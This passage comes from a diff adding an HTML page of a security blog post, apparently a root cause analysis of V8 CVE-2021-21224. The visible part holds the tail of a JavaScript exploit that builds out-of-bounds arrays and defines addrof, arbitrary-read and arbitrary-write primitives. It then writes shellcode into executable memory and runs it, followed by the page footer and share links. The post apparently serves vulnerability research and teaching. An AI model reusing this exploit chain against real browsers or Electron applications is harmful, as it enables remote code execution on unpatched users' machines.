+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">arr_addrof</span> <span style="color:#f92672">=</span> [{}];
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">aar_double</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">2.17</span>, <span style="color:#ae81ff">2.17</span>];
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">www_double</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Float64Array</span>(<span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span><span>        <span style="color:#66d9ef">return</span> [<span style="color:#a6e22e">oob_smi</span>, <span style="color:#a6e22e">oob_double</span>, <span style="color:#a6e22e">arr_addrof</span>, <span style="color:#a6e22e">aar_double</span>, <span style="color:#a6e22e">www_double</span>];
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40</span><span>    }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41</span><span>    <span style="color:#a6e22e">gc</span>();
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43</span><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x10000</span>; <span style="color:#f92672">++</span><span style="color:#a6e22e">i</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44</span><span>        <span style="color:#a6e22e">f</span>(<span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45</span><span>    }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46</span><span>    <span style="color:#66d9ef">let</span> [<span style="color:#a6e22e">oob_smi</span>, <span style="color:#a6e22e">oob_double</span>, <span style="color:#a6e22e">arr_addrof</span>, <span style="color:#a6e22e">aar_double</span>, <span style="color:#a6e22e">www_double</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">f</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47</span><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[+] oob_smi.length = &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">oob_smi</span>.<span style="color:#a6e22e">length</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48</span><span>    <span style="color:#a6e22e">oob_smi</span>[<span style="color:#ae81ff">14</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1234</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49</span><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[+] oob_double.length = &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">oob_double</span>.<span style="color:#a6e22e">length</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51</span><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">primitive</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52</span><span>        <span style="color:#a6e22e">addrof</span><span style="color:#f92672">:</span> (<span style="color:#a6e22e">obj</span>) =&gt; {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53</span><span>            <span style="color:#a6e22e">arr_addrof</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54</span><span>            <span style="color:#66d9ef">return</span> (<span style="color:#a6e22e">oob_double</span>[<span style="color:#ae81ff">8</span>].<span style="color:#a6e22e">f2i</span>() <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">n</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span><span style="color:#a6e22e">n</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55</span><span>        },
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56</span><span>        <span style="color:#a6e22e">half_aar64</span><span style="color:#f92672">:</span> (<span style="color:#a6e22e">addr</span>) =&gt; {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57</span><span>            <span style="color:#a6e22e">oob_double</span>[<span style="color:#ae81ff">15</span>] <span style="color:#f92672">=</span> ((<span style="color:#a6e22e">oob_double</span>[<span style="color:#ae81ff">15</span>].<span style="color:#a6e22e">f2i</span>() <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff00000000</span><span style="color:#a6e22e">n</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58</span><span>                              <span style="color:#f92672">|</span> ((<span style="color:#a6e22e">addr</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x8</span><span style="color:#a6e22e">n</span>) <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span><span style="color:#a6e22e">n</span>)).<span style="color:#a6e22e">i2f</span>();
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59</span><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">aar_double</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">f2i</span>();
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60</span><span>        },
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61</span><span>        <span style="color:#a6e22e">full_aaw</span><span style="color:#f92672">:</span> (<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">values</span>) =&gt; {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62</span><span>            <span style="color:#a6e22e">oob_double</span>[<span style="color:#ae81ff">27</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8888</span><span style="color:#a6e22e">n</span>.<span style="color:#a6e22e">i2f</span>();
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63</span><span>            <span style="color:#a6e22e">oob_double</span>[<span style="color:#ae81ff">28</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">addr</span>.<span style="color:#a6e22e">i2f</span>();
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64</span><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">values</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65</span><span>                <span style="color:#a6e22e">www_double</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">values</span>[<span style="color:#a6e22e">i</span>];
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66</span><span>            }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67</span><span>        }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68</span><span>    };
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70</span><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">primitive</span>.<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">oob_double</span>).<span style="color:#a6e22e">hex</span>());
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71</span><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">addr_instance</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">primitive</span>.<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">instance</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72</span><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[+] instance = &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">addr_instance</span>.<span style="color:#a6e22e">hex</span>());
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73</span><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">addr_shellcode</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">primitive</span>.<span style="color:#a6e22e">half_aar64</span>(<span style="color:#a6e22e">addr_instance</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x68</span><span style="color:#a6e22e">n</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74</span><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[+] shellcode = &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">addr_shellcode</span>.<span style="color:#a6e22e">hex</span>());
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75</span><span>    <span style="color:#a6e22e">primitive</span>.<span style="color:#a6e22e">full_aaw</span>(<span style="color:#a6e22e">addr_shellcode</span>, <span style="color:#a6e22e">shellcode</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76</span><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[+] GO&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">77</span><span>    <span style="color:#a6e22e">exec_shellcode</span>();
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">78</span><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">79</span><span>}
+</span></span></code></pre></div>
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/posts">Posts</a></li>
+         
+          <li><a href="/about">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=%2f%2flocalhost%3a1313%2fposts%2fv8-rca%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=%2f%2flocalhost%3a1313%2fposts%2fv8-rca%2f&text=V8%20CVE-2021-21224%20Renderer%20RCE%20Root%20Cause%20Analysis" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=%2f%2flocalhost%3a1313%2fposts%2fv8-rca%2f&title=V8%20CVE-2021-21224%20Renderer%20RCE%20Root%20Cause%20Analysis" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=%2f%2flocalhost%3a1313%2fposts%2fv8-rca%2f&is_video=false&description=V8%20CVE-2021-21224%20Renderer%20RCE%20Root%20Cause%20Analysis" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=V8%20CVE-2021-21224%20Renderer%20RCE%20Root%20Cause%20Analysis&body=Check out this article: %2f%2flocalhost%3a1313%2fposts%2fv8-rca%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=%2f%2flocalhost%3a1313%2fposts%2fv8-rca%2f&title=V8%20CVE-2021-21224%20Renderer%20RCE%20Root%20Cause%20Analysis" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=%2f%2flocalhost%3a1313%2fposts%2fv8-rca%2f&title=V8%20CVE-2021-21224%20Renderer%20RCE%20Root%20Cause%20Analysis" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=%2f%2flocalhost%3a1313%2fposts%2fv8-rca%2f&name=V8%20CVE-2021-21224%20Renderer%20RCE%20Root%20Cause%20Analysis&description=%3ch3%20id%3d%22v8-cve-2021-21224-renderer-rce-root-cause-analysis%22%3eV8%20CVE-2021-21224%20Renderer%20RCE%20Root%20Cause%20Analysis%3c%2fh3%3e%0a%3cp%3eInitially%2c%20I%20didn%e2%80%99t%20know%20much%20about%20V8%e2%80%99s%20exploitation%20as%20I%20was%20a%20web%20guy%20with%20interest%20in%20v8%2c%20it%20was%20my%20CTF%20teammate%2c%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2fptryudai%3flang%3den%22%3eptr-yudai%3c%2fa%3e%2c%20who%20helped%20me%20craft%20the%20Discord%20exploit.%20Back%20then%2c%20understanding%20the%20root%20cause%20wasn%e2%80%99t%20always%20necessary%3b%20for%20some%20of%20the%20exploits%20used%20in%20%3ca%20href%3d%22https%3a%2f%2fmedia.defcon.org%2fDEF%2520CON%252030%2fDEF%2520CON%252030%2520presentations%2fAaditya%2520Purani%2520-%2520ElectroVolt%2520Pwning%2520popular%2520desktop%2520apps%2520while%2520uncovering%2520new%2520attack%2520surface%2520on%2520Electron.pdf%22%3eElectrovolt%3c%2fa%3e%20research%2c%20I%20relied%20on%20regression%20tests%20added%20with%20patches%20or%20on%20existing%20exploits%20from%20GitHub%20or%20blogs.%20From%20there%2c%20I%20would%20write%20primitives%20and%20exploit%20Electron%20internals%20as%20needed.%20The%20goal%20for%20Electrovolt%20research%20was%20to%20exploit%20Electron%20apps%20running%20on%20older%20Chromium%20V8%20versions%20with%20plenty%20of%20known%20bugs%2c%20often%20by%20using%20a%20JIT%20bug%2c%20writing%20the%20exploit%2c%20and%20compromising%20the%20app%2c%20so%20I%20never%20had%20to%20know%20about%20the%20root%20cause%20of%20the%20issue%20%f0%9f%98%82.%3c%2fp%3e" aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=%2f%2flocalhost%3a1313%2fposts%2fv8-rca%2f&t=V8%20CVE-2021-21224%20Renderer%20RCE%20Root%20Cause%20Analysis" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2024  Copyright © s1r1us 
+    
+      
+    
+      
+      
+      
+        <a class="icon" target="_blank" rel="noopener" href="https://github.com/ElecmsrkptrovoltSec" aria-label="github">
+          <i class="fab fa-github" aria-hidden="true"></i>
+        </a>
+        
+      
+      
+        <a class="icon" target="_blank" rel="noopener" href="mailto:l33tsirius@gmail.com" aria-label="Email">
+          <i class="fas fa-envelope" aria-hidden="true"></i>
+        </a>
+        
+      
+      
+        <a class="icon" target="_blank" rel="noopener" href="https://twitter.com/s1r1u5_" aria-label="twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+        
+      
+      
+    
+  
+  </div>
+  <div class="footer-right">
+    <nav>
+    
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">Posts</a></li>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+<script src=/js/code-copy.js></script>
+
+
+
+
+</html>
